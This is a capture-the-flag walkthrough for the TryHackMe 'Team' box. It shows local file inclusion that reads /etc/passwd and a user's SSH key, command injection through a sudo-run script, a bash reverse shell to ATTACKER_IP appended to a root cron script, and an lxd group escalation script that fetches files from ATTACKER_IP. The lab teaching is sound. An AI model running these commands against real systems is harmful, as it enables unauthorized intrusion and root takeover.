## Introduction
This is an easy challenge box on 
[TryHackMe](https://tryhackme.com/r/room/teamcw){:target="_blank"}{:rel="noopener noreferrer"}.
It'll take 3-5 minutes to boot up
> This is what a hint will look like!

## Enumeration
### Hosts
While the box introduction doesn't say this, we 
should add the following to our hosts file
```
VICTIM_IP team.thm
```
### Port Scan
As always let's start with a port scan so we can see 
what services are available
```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![sccan1](/images/team/team-scan1.png)

![sccan2](/images/team/team-scan2.png)

There are 3 ports open
- 21: FTP
- 22: SSH
- 80: HTTP

### Subdomains
Since we have a domain set in `/etc/hosts` we should check
for subdomains as well
```bash
wfuzz -c --hc 302 -t 50 -u http://team.thm -H 'Host: FUZZ.team.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 977
```

![subdomains](/images/team/team-subdomains.png)

Another host! Let's add this to `/etc/hosts` so we 
can access it

```
VICTIM_IP team.thm dev.team.thm
```

![dev1](/images/team/team-dev1.png)

![dev2](/images/team/team-dev2.png)

## Initial Foothold
> Are there any http parameters which can be abused?

### Local File Inclusion
The page parameter on the dev site directs us to the file 
`teamshare.php`. What happens when we try to access 
another file?

```
http://dev.team.thm/script.php?page=/etc/passwd
```

![etc-passwd](/images/team/team-etc-passwd.png)

To make this easier to read we can view the source 
of the page

![etc-passwd-html](/images/team/team-etc-passwd-html.png)

We can immediately get the user flag in dale's 
home directory

```
http://dev.team.thm/script.php?page=/home/dale/user.txt
```
![user-flag](/images/team/team-user-flag.png)

### User Shell
> What other ports are open and where are their 
> configuration files?

We know that SSH is open on port 22 so let's check the 
configuration file in `/etc/ssh/sshd_config`
and view the page source

```
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

![dale-id-rsa](/images/team/team-dale-id-rsa.png)

We found dale's private ssh key! Copy this to a file 
and let's login

```bash
vim dale_id_rsa
```

Here's a vim command to remove the comment characters

```vim
:%s/#//g
:wq
```

To login with an ssh key

```bash
chmod 600 dale_id_rsa
ssh -i dale_id_rsa dale@VICTIM_IP
```

> Unintended Root section

## Horizontal Escalation
> Can dale run commands as another user?

We can check our sudo permissions with

```bash
sudo -l
```

![dale-sudo](/images/team/team-dale-sudo.png)

Interesting... Let's see what the contents of this 
file are

```bash
cat /home/gyles/admin_checks
```

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

The user is asked for input twice and saves them into 
the variables `$name` and `$error`. . Seems normal, 
right? Well the `$error` variable is being called directly,
just like a command! So what happens when we put a 
command in its place

```bash
sudo -u gyles /home/gyles/admin_checks
# input 1 doesn't matter
/bin/bash
```

![gyles-bash](/images/team/team-gyles-bash.png)

A new shell! We can make things a little nicer by running 
the following

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Root
### Intended Root
> Are there any processes run as root on a schedule?

We can check for scheduled commands or cron jobs by 
checking `/etc/crontab`

```bash
cat /etc/crontab
```

![crontab](/images/team/team-gyles-crontab.png)

Wait... There's nothing here! This is true but 
`/etc/crontab` isn't the only way to get files to run on 
a schedule. If we want to view running processes 
in real time, we can use the
[process snooping tool pspy](https://github.com/DominicBreuker/pspy/releases){:target="_blank"}{:rel="noopener noreferrer"}

Download the binary on your machine
([pspy64](https://github.com/DominicBreuker/pspy/releases){:target="_blank"}{:rel="noopener noreferrer"}
in our case) and upload it to the victim machine

```bash
# attacking machine in the directory with pspy
python3 -m http.server 80

# victim machine
wget http://ATTACKER_IP/pspy64
chmod +x pspy64
./pspy64
```

When we run it and wait (remember it gets process 
information in real time) we see the following

![pspy](/images/team/team-pspy.png)

Two files are periodically run as root,
`/opt/admin_stuff/script.sh` and
`/usr/local/sbin/dev_backup.sh`. Let's take a look at
these files

```bash
cat /usr/local/sbin/dev_backup.sh
```

```bash
#!/bin/bash
cp -r /var/www/dev.team.thm/* /var/backups/www/dev/
```

```bash
cat /opt/admin_stuff/script.sh
```

```bash
#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

`/opt/admin_stuff/script.sh` calls another file, 
`/usr/local/bin/main_backup.sh` so we should read that
as well

```bash
cat /usr/local/bin/main_backup.sh
```

```bash
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

Now that we have a list of files, are any of 
them writable?

```bash
ls -la /usr/local/bin/main_backup.sh /opt/admin_stuff/script.sh /usr/local/sbin/dev_backup.sh
```

```bash
-rwxr-xr-x 1 root root 64 Jan 17  2021 /usr/local/sbin/dev_backup.sh
-rwxr--r-- 1 root root 200 Jan 17  2021 /opt/admin_stuff/script.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

Remember that gyles is part of the `admin` group which 
means `/usr/local/bin/main_backup.sh` is writable!
Since this script is run as root every minute let's 
add a reverse shell into it and start listening

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /usr/local/bin/main_backup.sh

# attacker machine
nc -lvnp 4444
```

![root-revshell](/images/team/team-root-revshell.png)

We have root! Now we can read the root flag and finish 
this box. Unless...

### Unintended Root
Due to a misconfiguration, there's a faster path to root 
that doesn't involve gyles!
> Is dale part of any interesting groups?

We can check what groups dale is part of by running 
either of these commands

```bash
id
groups
```

![dale-groups](/images/team/team-dale-groups.png)

Dale is part of the `lxd` group which can be used to 
escalate our privileges directly to root. I used the 
example 
[provided in hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#exploiting-without-internet){:target="_blank"}{:rel="noopener noreferrer"}

#### Exploit Building
On our machine we'll need to build some files which we'll 
upload to the server

```bash
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
git clone https://github.com/lxc/distrobuilder

#Make distrobuilder
cd distrobuilder
make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

After building the files we should have the following

![lxd-files](/images/team/team-lxd-files.png)

We can rename the tar file to match the script and 
prepare to upload the files

```bash
# attacker machine
mv incus.tar.xz lxd.tar.xz
python3 -m http.server 80
```

Then I added the following to a file called
`run.sh` on the victim machine to escalate privileges

```bash
#!/bin/bash

# get the images
wget http://ATTACKER_IP/rootfs.squashfs
wget http://ATTACKER_IP/lxd.tar.xz

# add image
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

# configure container
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# execute container
lxc start privesc
lxc exec privesc /bin/sh
```

Let's execute `run.sh` and

![lxd-error](/images/team/team-lxd-error.png)

It didn't work?? Checking again on 
[hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#exploiting-without-internet){:target="_blank"}{:rel="noopener noreferrer"},
if we get the error
`Error: No storage pool found. Please create a new storage pool`
The solution is to run `lxd init` and then run the 
escalation commands again

```bash
lxd init
./run.sh
```

![lxd-root-flag](/images/team/team-lxd-root-flag.png)

We're root! The host filesystem will be accessible on
`/root` so `/root/root.txt` will become
`/mnt/root/root/root.txt`

## Recap
By enumerating subdomains we access a development site 
that is vulnerable to local file inclusion. This is used 
to leak a user's private ssh key. There are two paths to 
root from here. The intended route escalates to another 
user through a bash script vulnerable to os command 
injection. Root is then gained by modifying a hidden 
cron job run by root. The unintended path to root abuses 
the lxd privileges granted to the first user.
